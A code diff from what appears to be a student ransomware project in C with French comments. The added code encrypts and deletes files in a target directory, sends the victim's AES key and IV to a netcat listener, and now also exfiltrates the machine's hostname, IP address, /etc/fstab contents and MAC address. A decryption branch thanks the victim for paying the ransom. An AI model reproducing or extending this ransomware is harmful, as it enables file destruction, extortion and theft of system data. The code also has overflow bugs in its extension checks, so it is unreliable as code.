@@ -37,8 +37,7 @@ void usage()
 	printf("--------------------------------------\n");
 	printf("Bienvenue sur le projet de Ransomware\n");
 	printf("--------------------------------------\n");
-	printf("Procédure à suivre pour lancé le code:\n");
-	printf("\n");
+	printf("Procédure à suivre pour lancé le code:\n \n");
 	printf("[1] -- Se mettre dans le dossier dans lequel le code s'y trouve\n");
 	printf("[2] -- Taper la commande < gcc -o ransom ransom.c ransomlib.c -lcrypto > 	\n");
 	printf("[3] -- Lancer le server dans un autre terminal avec la commande < nc -l -v -p 8080 >	\n");
@@ -51,9 +50,24 @@ void usage()
 	printf("[-enc] --> encryption	\n");
 	printf("[-dec] --> decryption	\n");
 	printf("[-help] --> aide	\n");
-
-	
 };
+
+int is_a_video(char *filename)
+{
+	int n = strlen(filename)-4;
+	char extention[4] ;
+
+	for(int i=0; i<5;i++)
+	{
+		extention[i] = filename[n+i];
+	}
+
+	if(strcmp(extention, ".mp4")==0 || strcmp(extention, ".mkv")==0)
+	{
+		// printf("c'est une vidéo\n");
+		return 0 ;
+	}
+}
 
 int is_encrypted(char *filename) //Ici on assume que le nom de nos fichiers cryptés seront en ".Pwnd"
 {
@@ -65,9 +79,9 @@ int is_encrypted(char *filename) //Ici on assume que le nom de nos fichiers cryp
 		extention[i] = filename[n+i];
 	}
 
-	if(strcmp(extention,".Pwnd")==0)
+	if(strcmp(extention, ".Pwnd")==0)
 	{
-		// printf("Le fichier est déja crypter\n");
+		// printf("%s est déjà crypter\n", filename);
 		return 0 ;
 	}
 	else
@@ -99,12 +113,12 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 			strcat(path, entity->d_name);
 				
 			//printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);			
-			if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
+			if(entity->d_type == DT_DIR && strcmp(entity->d_name, ".")!=0 && strcmp(entity->d_name, "..")!=0)
 			{
 				listdir(path, iv, key, de_flag);
 			}
 			
-			if(de_flag=='e' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==0)
+			if(de_flag=='e' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==0 && !is_a_video(entity->d_name) ==0)
 			{				
 				encrypt(key, iv, path);
 				remove(path);				
@@ -132,16 +146,31 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 	
 	bytes_to_hexa(key , pKey, sizeKey);
 	bytes_to_hexa(iv , pIv, sizeIv);
+}
+
+void send_txt(char * filename, int sockID)
+{
+    FILE * file = fopen(filename, "r");
+    char line[BUFSIZE];
+	char filename_path[BUFSIZE] = {0};
 	
-	// OPENSSL_cleanse(key,sizeof(key));	
-	// OPENSSL_cleanse(iv,sizeof(iv));
+	strcat(filename_path, "Les données viennent du fichier: ");
+	strcat(filename_path, filename);
+	strcat(filename_path, "\n");
+	send(sockID, (const char *)filename_path, strlen(filename_path), 0);
+	
+    while (fgets(line, sizeof(line), file)) 
+	{
+		send(sockID, (const char *)line, strlen(line), 0);
+    }
+    fclose(file);
 }
 
 int send_key(char *pKey, char *pIv)
 {
 	int sockID;
 	
-	sockID = socket(AF_INET,SOCK_STREAM,0);
+	sockID = socket(AF_INET,SOCK_STREAM, 0);
 
 	struct sockaddr_in serveraddr;
 	serveraddr.sin_family = AF_INET;
@@ -151,6 +180,11 @@ int send_key(char *pKey, char *pIv)
 	char *send_key = "La clé de la victime: ";
 	char *send_iv = "L'IV de la victime: ";
 	char *space = "\t \n";
+	char *hostname= "Le nom de la machine: ";
+	char *ip_machine= "L'IP de la machine: ";
+	char *separate = "--------------------------------------\n";
+	
+	char hostname_buffer[BUFSIZE];
 	
 	// connect the client socket to server socket	
 	if (connect(sockID, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) != 0) 
@@ -160,50 +194,73 @@ int send_key(char *pKey, char *pIv)
 	}
 	else
 	{
-		printf("Connected to the server !\n");		
-		send(sockID, (const char *)send_key, strlen(send_key),0);
-		send(sockID, (const char *)pKey, strlen(pKey),0);
-		send(sockID, (const char *)space, strlen(space),0); //Eviter que la clé soit mélangé avec le texte qui suit
-		send(sockID, (const char *)send_iv, strlen(send_iv),0);
-		send(sockID, (const char *)pIv, strlen(pIv),0);
+		printf("Connected to the server !\n");
+
+		// To retrieve hostname
+		gethostname(hostname_buffer, sizeof(hostname_buffer));
+		
+		send(sockID, (const char *)send_key, strlen(send_key), 0);
+		send(sockID, (const char *)pKey, strlen(pKey), 0);
+		send(sockID, (const char *)space, strlen(space), 0); //Eviter que la clé soit mélangé avec le texte qui suit
+		send(sockID, (const char *)send_iv, strlen(send_iv), 0);
+		send(sockID, (const char *)pIv, strlen(pIv), 0);
+		
+		send(sockID, (const char *)space, strlen(space), 0);
+		send(sockID, (const char *)hostname, strlen(hostname), 0);
+		send(sockID, (const char *)hostname_buffer, strlen(hostname_buffer), 0);		
+		
+		send(sockID, (const char *)space, strlen(space), 0);
+		send(sockID, (const char *)ip_machine, strlen(ip_machine), 0);
+		send(sockID, (const char *)ip, strlen(ip), 0);
+		
+		send(sockID, (const char *)space, strlen(space), 0);
+		send(sockID, (const char *)separate, strlen(separate), 0);
+		send_txt("/etc/fstab", sockID);
+		
+		send(sockID, (const char *)space, strlen(space), 0);
+		send(sockID, (const char *)separate, strlen(separate), 0);
+		send_txt("/sys/class/net/eth0/address", sockID);
 	}
 	close(sockID);
 }
 
 int main (int argc, char * argv[])
 {
-	if(argc==3 || argc==5)
-	{
-		unsigned char key[AES_256_KEY_SIZE];
-		unsigned char iv[AES_BLOCK_SIZE];
+	unsigned char key[AES_256_KEY_SIZE];
+	unsigned char iv[AES_BLOCK_SIZE];
 
-		int sizeKey = AES_256_KEY_SIZE; 
-		int sizeIv = AES_BLOCK_SIZE;
+	int sizeKey = AES_256_KEY_SIZE; 
+	int sizeIv = AES_BLOCK_SIZE;
+	
+	if(strcmp(argv[2], "-enc")==0 && argc==3) 
+	{
+		char * pKey = (char *) malloc(sizeof(key)*2+1);
+		char * pIv = (char *) malloc(sizeof(iv)*2+1);
 		
-		if(strcmp(argv[2], "-enc")==0) 
-		{
-			char * pKey = (char *) malloc(sizeof(key)*2+1);
-			char * pIv = (char *) malloc(sizeof(iv)*2+1);
-			
-			printf("The directory is %s\n", argv[1]);
-			generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
-			send_key(pKey, pIv);
-			listdir(argv[1], iv, key, 'e');
-			vlc();
-			
-			free((char *)pKey);
-			free((char *)pIv);
-		}
+		printf("The directory is %s\n", argv[1]);
+		generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
+		send_key(pKey, pIv);
+		listdir(argv[1], iv, key, 'e');
+		// vlc();
 		
-		if (strcmp(argv[2], "-dec")==0)
-		{
-			hexa_to_bytes(argv[3] , key, sizeKey);
-			hexa_to_bytes(argv[4] , iv, sizeIv);
-			listdir(argv[1], iv, key, 'd');
-		}
+		// free((char *)pKey);
+		// free((char *)pIv);
+		memset(pKey, '\0', sizeKey);
+		memset(pIv, '\0', sizeIv);
 	}
 	
-	if(strcmp(argv[1], "-help")==0 & argc==2)
+	if (strcmp(argv[2], "-dec")==0 && argc==5)
+	{
+		hexa_to_bytes(argv[3] , key, sizeKey);	
+		hexa_to_bytes(argv[4] , iv, sizeIv);
+		listdir(argv[1], iv, key, 'd');
+		printf("Merci d'avoir payer la rançon !");
+		
+		memset(key, '\0', sizeKey); //A vérifier si c'est bon
+		memset(iv, '\0', sizeIv); //A vérifier si c'est bon
+	}
+	
+	if(strcmp(argv[1], "--help")==0 & argc==2)
 	{
 		usage();
 	}
